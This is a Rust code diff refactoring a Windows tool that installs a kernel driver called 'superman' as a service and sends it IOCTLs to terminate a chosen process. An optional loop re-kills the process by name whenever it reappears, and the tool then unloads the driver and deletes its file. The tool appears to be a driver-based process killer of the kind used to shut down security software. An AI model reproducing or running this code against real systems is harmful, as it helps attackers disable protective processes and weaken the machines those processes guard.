@@ -1,13 +1,12 @@
 use crate::args::Args;
 use crate::utils::{get_process_name, get_process_pid};
-use crate::{DRIVER_PATH, EXIT};
 use anyhow::anyhow;
 use std::cell::RefCell;
-use std::ffi::CStr;
+use std::ffi::{CStr, CString};
 use std::mem::{size_of_val, zeroed};
 use std::path::Path;
 use std::ptr::{addr_of, addr_of_mut, null, null_mut};
-use std::sync::atomic::Ordering::Acquire;
+use std::sync::mpsc::Receiver;
 use std::thread::sleep;
 use std::time::Duration;
 use std::{fs, process};
@@ -19,18 +18,65 @@ use windows_sys::Win32::Storage::FileSystem::{
 };
 use windows_sys::Win32::System::Services::{
     CloseServiceHandle, ControlService, CreateServiceA, DeleteService, OpenSCManagerA,
-    OpenServiceA, StartServiceA, SC_MANAGER_ALL_ACCESS, SC_MANAGER_CREATE_SERVICE,
-    SERVICE_CONTROL_STOP, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, SERVICE_KERNEL_DRIVER,
-    SERVICE_START, SERVICE_STATUS, SERVICE_STOP,
+    OpenServiceA, QueryServiceStatus, StartServiceA, SC_MANAGER_ALL_ACCESS,
+    SC_MANAGER_CREATE_SERVICE, SERVICE_CONTROL_STOP, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
+    SERVICE_KERNEL_DRIVER, SERVICE_RUNNING, SERVICE_START, SERVICE_STATUS, SERVICE_STOP,
+    SERVICE_STOPPED,
 };
 use windows_sys::Win32::System::IO::DeviceIoControl;
 
-const SERVICE_NAME: &CStr = unsafe { CStr::from_bytes_with_nul_unchecked(b"superman\0") };
-const INITIALIZE_IOCTL_CODE: u32 = 0x9876C004u32;
-const TERMINATE_PROCESS_IOCTL_CODE: u32 = 0x9876C094u32;
+/// Make sure driver status
+fn check_service_status(driver: (&Path, &CStr)) -> anyhow::Result<bool> {
+    unsafe {
+        let scm = OpenSCManagerA(null(), null(), SC_MANAGER_CREATE_SERVICE);
+        if scm == 0 {
+            return Err(anyhow!("[-]OpenSCManagerA failed {}!", GetLastError()));
+        }
+
+        let service = OpenServiceA(scm, driver.1.as_ptr().cast(), SC_MANAGER_ALL_ACCESS);
+        if service == 0 {
+            CloseServiceHandle(scm);
+            return Ok(false);
+        }
+
+        let mut status: SERVICE_STATUS = zeroed();
+
+        let res = QueryServiceStatus(service, addr_of_mut!(status).cast());
+
+        if res == FALSE {
+            CloseServiceHandle(scm);
+            CloseServiceHandle(service);
+            return Err(anyhow!("[-]QueryServiceStatus failed {}!", GetLastError()));
+        }
+
+        match status.dwCurrentState {
+            SERVICE_RUNNING => Ok(true),
+            SERVICE_STOPPED => {
+                let res = StartServiceA(service, 0, null());
+                if res == FALSE {
+                    CloseServiceHandle(scm);
+                    CloseServiceHandle(service);
+                    return Err(anyhow!("[-]StartServiceA failed {}!", GetLastError()));
+                };
+
+                Ok(true)
+            }
+            _ => {
+                unload_driver(driver)?;
+                Ok(false)
+            }
+        }
+    }
+}
 
 /// Load and start driver from path
-pub fn load_driver(path: &CStr) -> anyhow::Result<()> {
+pub fn load_driver(driver: (&Path, &CStr)) -> anyhow::Result<()> {
+    if check_service_status(driver)? {
+        return Ok(());
+    }
+
+    let path = CString::new(driver.0.to_string_lossy().as_ref())?;
+
     unsafe {
         let scm = OpenSCManagerA(null(), null(), SC_MANAGER_CREATE_SERVICE);
         if scm == 0 {
@@ -39,8 +85,8 @@ pub fn load_driver(path: &CStr) -> anyhow::Result<()> {
 
         let service = CreateServiceA(
             scm,
-            SERVICE_NAME.as_ptr().cast(),
-            SERVICE_NAME.as_ptr().cast(),
+            driver.1.as_ptr().cast(),
+            driver.1.as_ptr().cast(),
             SERVICE_START | DELETE | SERVICE_STOP,
             SERVICE_KERNEL_DRIVER,
             SERVICE_DEMAND_START,
@@ -55,12 +101,7 @@ pub fn load_driver(path: &CStr) -> anyhow::Result<()> {
 
         if service == 0 {
             CloseServiceHandle(scm);
-            let err = GetLastError();
-
-            return match err {
-                1073 => Ok(()),
-                _ => Err(anyhow!("[-]CreateServiceA failed {}!", err)),
-            };
+            return Err(anyhow!("[-]CreateServiceA failed {}!", GetLastError()));
         }
 
         println!("[+]Service created successfully!");
@@ -82,7 +123,7 @@ pub fn load_driver(path: &CStr) -> anyhow::Result<()> {
 }
 
 /// Unload and delete driver by name
-pub fn unload_delete_driver(path: &Path) -> anyhow::Result<()> {
+pub fn unload_driver(driver: (&Path, &CStr)) -> anyhow::Result<()> {
     let mut status: SERVICE_STATUS = unsafe { zeroed() };
 
     unsafe {
@@ -91,7 +132,7 @@ pub fn unload_delete_driver(path: &Path) -> anyhow::Result<()> {
             return Err(anyhow!("[-]OpenSCManagerA failed {}!", GetLastError()));
         }
 
-        let service = OpenServiceA(scm, SERVICE_NAME.as_ptr().cast(), SC_MANAGER_ALL_ACCESS);
+        let service = OpenServiceA(scm, driver.1.as_ptr().cast(), SC_MANAGER_ALL_ACCESS);
         if service == 0 {
             CloseServiceHandle(scm);
             return Err(anyhow!("[-]OpenServiceA failed {}!", GetLastError()));
@@ -116,13 +157,17 @@ pub fn unload_delete_driver(path: &Path) -> anyhow::Result<()> {
         }
     }
 
-    fs::remove_file(path).unwrap();
+    if driver.0.exists() {
+        fs::remove_file(driver.0)?;
+    }
 
     Ok(())
 }
 
 /// Send ioctl to kill pid
-pub fn kill_pid(args: Args) -> anyhow::Result<()> {
+pub fn kill_pid(args: &Args, driver: (&Path, &CStr), rx: Receiver<bool>) -> anyhow::Result<()> {
+    let initialize_ioctl_code: u32 = 0x9876C004u32;
+    let terminate_process_ioctl_code: u32 = 0x9876C094u32;
     let device_name = CStr::from_bytes_with_nul(b"\\\\.\\superman\0")?;
     let pid = args.pid;
     let mut output = 0u64;
@@ -162,24 +207,24 @@ pub fn kill_pid(args: Args) -> anyhow::Result<()> {
         });
 
         let kill = |pid| {
-            match device_io_control.borrow_mut()(TERMINATE_PROCESS_IOCTL_CODE, pid) {
+            match device_io_control.borrow_mut()(terminate_process_ioctl_code, pid) {
                 Ok(_) => println!("[+]Process {} has been terminated!", pid),
                 Err(e) => eprintln!("{}", e),
             };
         };
 
         // Init driver
-        device_io_control.borrow_mut()(INITIALIZE_IOCTL_CODE, pid)?;
-        println!("[+]Driver initialized {:#x}!", INITIALIZE_IOCTL_CODE);
+        device_io_control.borrow_mut()(initialize_ioctl_code, pid)?;
+        println!("[+]Driver initialized {:#x}!", initialize_ioctl_code);
 
         if args.recursive {
             let name = get_process_name(pid);
 
             loop {
                 // exit
-                if EXIT.load(Acquire) {
+                if rx.try_recv().is_ok() {
                     CloseHandle(device);
-                    unload_delete_driver(DRIVER_PATH.get().unwrap()).unwrap();
+                    unload_driver(driver)?;
                     process::exit(0i32);
                 }
 
